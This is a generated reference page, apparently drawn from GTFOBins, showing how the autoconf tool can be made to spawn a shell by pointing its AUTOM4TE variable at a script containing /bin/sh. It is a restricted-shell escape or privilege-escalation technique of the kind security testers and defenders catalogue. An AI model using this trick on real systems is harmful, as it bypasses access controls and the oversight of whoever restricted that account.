---
parsed_by: focuslocust
source: commands
type: generated
---
# autoconf Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## autoconf

Tool page: [autoconf](../../tools/linux/autoconf.md)

### shell

```text
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoconf` |
| Evidence | Function example preserved from source parser. |
